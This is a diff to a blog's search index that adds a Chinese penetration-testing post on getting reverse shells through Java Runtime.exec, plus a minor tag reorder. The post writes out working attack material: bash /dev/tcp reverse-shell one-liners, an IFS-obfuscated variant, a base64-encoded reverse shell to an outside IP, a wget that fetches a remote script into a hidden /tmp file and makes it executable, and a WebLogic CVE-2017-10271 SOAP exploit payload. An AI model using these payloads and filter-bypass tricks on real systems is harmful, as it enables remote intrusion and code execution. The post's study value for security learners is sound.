@@ -89,6 +89,154 @@
     </entry>
     
     <entry>
+      <title><![CDATA[java反弹shell]]></title>
+      <url>/2020/01/13/Web%E6%B8%97%E9%80%8F/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/java%E5%8F%8D%E5%BC%B9shell/</url>
+      <content type="html"><![CDATA[<h1 id="java-反弹shell"><a href="#java-反弹shell" class="headerlink" title="java 反弹shell"></a>java 反弹shell</h1><p>[TOC]</p>
+<p>在渗透测试中，偶尔会遇到目标为java环境下的RCE，其中java命令执行的函数比较常见的分为Runtime和Process的类。这里遇到的坑以及解决方法。</p>
+<h2 id="runtime"><a href="#runtime" class="headerlink" title="runtime"></a>runtime</h2><p>这里主要涉及 <code>Runtime.getRuntime().exec()</code><br>测试用例如下：</p>
+<pre class=" language-java"><code class="language-java"><span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Runtime<span class="token punctuation">;</span>
+<span class="token keyword">import</span>  java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>Process<span class="token punctuation">;</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">exec</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token function">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">try</span><span class="token punctuation">{</span>
+            Runtime rt  <span class="token operator">=</span>   Runtime<span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            String<span class="token punctuation">[</span><span class="token punctuation">]</span> commands <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"ping"</span><span class="token punctuation">,</span><span class="token string">"-c"</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">,</span><span class="token string">"th9bvw.ceye.io"</span><span class="token punctuation">}</span><span class="token punctuation">;</span>
+            Process pc <span class="token operator">=</span> rt<span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span>commands<span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"11111"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            pc<span class="token punctuation">.</span><span class="token function">waitFor</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span><span class="token keyword">catch</span><span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">{</span>
+            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"2222"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+    <span class="token punctuation">}</span>
+    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> argv<span class="token punctuation">)</span><span class="token punctuation">{</span>
+        exec e <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">exec</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<h3 id="管道符号"><a href="#管道符号" class="headerlink" title="管道符号"></a>管道符号</h3><p>在遇到对渗透目标执行重定向或者pipeline的时候，对应符号不会被解析，重定向或管道符号失效。解析如下：</p>
+<pre><code>ls /tmp/ | grep xx
+</code></pre><p>这个时候 该程序中管道符号被视为普通字符</p>
+<pre><code>ls &quot;/tmp&quot; &quot;|&quot; &quot;grep&quot; &quot;xx&quot;
+</code></pre><p>比如遇到以下环境：</p>
+<ul>
+<li>weblogic 漏洞 在执行weblogic RCE中，对其进行测试并使其载入远程服务器上面的木马时，需要满足条件如下：</li>
+<li>命令执行，载入下载程序并执行下载程序，在这个时候命令如下：</li>
+</ul>
+<pre><code>cmd = &quot;wget http://th9bvw.ceye.io/down_v2_1.sh -q -O /tmp/.font-unixx &amp;&amp; chmod +x /tmp/.font-unixx &amp;&quot;
+</code></pre><p>直接执行该命令，会发现&amp;&amp;后的语句并没有成功执行，这个时候就要执行以下方法了,以数组方法执行，详情参照<code>exec</code> 的重载</p>
+<h4 id="linux目标"><a href="#linux目标" class="headerlink" title="linux目标"></a>linux目标</h4><p>在linux下，常用方法（注意下，这里执行的时候，/bin/sh会以sh shell执行，/bin/bash会以bash执行，具体看怎么调用</p>
+<pre><code>String[] command = { &quot;/bin/sh&quot;, &quot;-c&quot;, cmds };
+Process ps = Runtime.getRuntime().exec(command );
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675380880.jpg" alt=""><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675525950.jpg" alt=""></p>
+<pre><code>sh -c 作用说明:
+让调用的bash 将一个字符串作为完整的命令来执行
+</code></pre><p>常用反弹shell</p>
+<ul>
+<li><p>sh</p>
+<pre><code>/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367303103.jpg" alt="-w331"></p>
+</li>
+<li><p>bash</p>
+<pre><code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
+</code></pre><p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367647957.jpg" alt="-w341"></p>
+</li>
+</ul>
+<p>这里备注下 OSX系统中存在多种shell<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706369208934.jpg" alt="-w562"><br>因为常用的shell 是zsh ，所以遇到多种情况有点坑，应该是环境变量没配好<br>如 以下命令：<br>在zsh中<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706370741721.jpg" alt="-w562"></p>
+<p>在bash中：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371257635.jpg" alt="-w531"></p>
+<p>在sh中:<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371690653.jpg" alt="-w987"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371954883.jpg" alt="-w901"></p>
+<h4 id="windows目标"><a href="#windows目标" class="headerlink" title="windows目标"></a>windows目标</h4><p>在windows下，常用方法</p>
+<pre><code>String[] command = { &quot;cmd&quot;, &quot;/c&quot;, cmds };
+Process ps = Runtime.getRuntime().exec(command );
+</code></pre><p>综上 即命令中涉及 <code>&lt;  &gt;  |  &amp;</code>等符号时<br><code>getRuntime().exec(String command )</code>此时已不适用，可以尝试<br><code>exec(String [] cmdArray) 
+ exec(String []cmdarray,String []envp,File dir)</code>来执行</p>
+<p> 但当遇到的命令执行的点是<code>getRuntime().exec(String command )</code>，此时这些绕过方法即不适用了。涉及到 <code>bypass exec</code> </p>
+<h2 id="bypass-exec"><a href="#bypass-exec" class="headerlink" title="bypass exec"></a>bypass exec</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="IFS"></a>IFS</h3><p>Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
+<pre><code> 而 IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。
+</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「whuslei」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="noopener">https://blog.csdn.net/whuslei/article/details/7187639</a></p>
+<p>查看其值<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704628317663.jpg" alt="-w308"></p>
+<p>“040”是空格，”011”是Tab，”012”是换行符”\n”<br>即简单来说 IFS可以替代 空格<br>在这里用来绕过尝试：<br>跟踪exec：<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629198309.jpg" alt="-w988"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629353562.jpg" alt="-w1065"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629504206.jpg" alt="-w1084"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629694526.jpg" alt="-w600"><br>这里可以明显看到 IFS起到了分隔符的作用<br>正常情况下<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706878745671.jpg" alt="-w430"><br>这样传入参数是可以执行的<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706884565379.jpg" alt="-w844"></p>
+<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706889154267.jpg" alt="-w1128"></p>
+<p>但是一个比较坑的事，在mac中bash 使用IFS没有反弹shell，但在centos中就可以使用,猜测是osx的环境变量有问题。<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643120846.jpg" alt="-w960"></p>
+<p>经测试，改用osx的shell环境 可以执行</p>
+<pre><code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/127.0.0.1/8888&lt;&amp;1
+</code></pre><p>centos中的反应<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643290042.jpg" alt="-w487"></p>
+<h3 id="命令执行base64编码"><a href="#命令执行base64编码" class="headerlink" title="命令执行base64编码"></a>命令执行base64编码</h3><p>在java反序列化中可能遇上反序列化命令执行中存在转义的现象，这个时候可以使用base64编码进行绕过</p>
+<pre><code>cmd = &quot;{echo,%s}|{base64,-d}|{bash,-i}&quot; %base64.b64encode(cmd)
+
+String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;}
+</code></pre><h4 id="反序列化示例"><a href="#反序列化示例" class="headerlink" title="反序列化示例"></a>反序列化示例</h4><h3 id="xml执行绕过"><a href="#xml执行绕过" class="headerlink" title="xml执行绕过"></a>xml执行绕过</h3><p>这里遇到在反序列化存在于xml中的时候，在用到管道符等时要用实体编码进行绕过处理</p>
+<h4 id="利用实例-CVE-2017-10271"><a href="#利用实例-CVE-2017-10271" class="headerlink" title="利用实例 CVE-2017-10271"></a>利用实例 CVE-2017-10271</h4><p>该漏洞利用poc如下：</p>
+<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
+      &lt;soapenv:Header&gt;
+        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
+          &lt;java&gt;
+            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
+              &lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;
+                &lt;void index=&quot;0&quot;&gt;
+                  &lt;string&gt;/bin/bash&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;1&quot;&gt;
+                  &lt;string&gt;-c&lt;/string&gt;
+                &lt;/void&gt;
+                &lt;void index=&quot;2&quot;&gt;
+                  &lt;string&gt;&#39;&#39;&#39;+cmd+&#39;&#39;&#39;&lt;/string&gt;
+                &lt;/void&gt;
+              &lt;/array&gt;
+              &lt;void method=&quot;start&quot;/&gt;
+            &lt;/void&gt;
+          &lt;/java&gt;
+        &lt;/work:WorkContext&gt;
+      &lt;/soapenv:Header&gt;
+      &lt;soapenv:Body/&gt;
+    &lt;/soapenv:Envelope&gt;
+</code></pre><p>其中在cmd中传入字符串的时候需要进行编码，否则会进行报错<br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699933180870.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699934142704.jpg" alt="-w1437"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699937854703.jpg" alt="-w878"><br><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699938012054.jpg" alt="-w513"></p>
+<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>wget http://th9bvw.ceye.io -o /tmp/.test12.sh <span class="token entity" title="&amp;">&amp;amp;</span><span class="token entity" title="&amp;">&amp;amp;</span>  chmod +x /tmp/.test12.sh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
+</code></pre>
+<p><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699981292782.jpg" alt="-w673"></p>
+<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>在测试中遇到在上传执行脚本时，发现系统上不存在wget、curl等命令，即无法直接通过shell 脚本进行云端下载请求，可以尝试使用Bash /dev/tcp 进行文件传输：</p>
+<p>通过 bash直接建立socket请求（待测试）</p>
+<pre class=" language-shell"><code class="language-shell">exec 8<>/dev/tcp/127.0.0.1/11211    
+#使用文件描述符8以<>(<读>写)方式，打开127.0.0.1的tcp11211端口
+ls -l /proc/self/fd                                   
+#查看打开的连接8
+echo -e "stats" >&8                             
+#向socket写入数据
+cat <&8                                                  
+#从socket读入数据
+exec 8<&-                                              
+#关闭socket读
+exec 8>&-                                              
+#关闭socket写
+</code></pre>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">编码转换</a><br><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">红队后渗透测试中的文件传输技巧</a></p>
+<p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a><br><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">bash扩展</a></p>
+]]></content>
+      
+        <categories>
+            
+            <category> web 渗透 </category>
+            
+            <category> java反序列化 </category>
+            
+            <category> java反弹shell </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> web 渗透 </tag>
+            
+            <tag> java反序列化 </tag>
+            
+            <tag> java反弹shell </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[Apache Solr CVE-2019-0193 复现与学习]]></title>
       <url>/2019/09/08/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/Apache%20Solr%20CVE-2019-0193%20%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%AD%A6%E4%B9%A0/</url>
       <content type="html"><![CDATA[<h1 id="Apache-Solr-CVE-2019-0193-复现与学习"><a href="#Apache-Solr-CVE-2019-0193-复现与学习" class="headerlink" title="Apache Solr CVE-2019-0193 复现与学习"></a>Apache Solr CVE-2019-0193 复现与学习</h1><p>[TOC]</p>
@@ -1271,9 +1419,9 @@ Content-Type代表发送端（客户端|服务器）发送的实体数据的数�
             
             <tag> Web渗透 </tag>
             
-            <tag> XXE </tag>
-            
             <tag> 漏洞学习 </tag>
+            
+            <tag> XXE </tag>
             
         </tags>
         
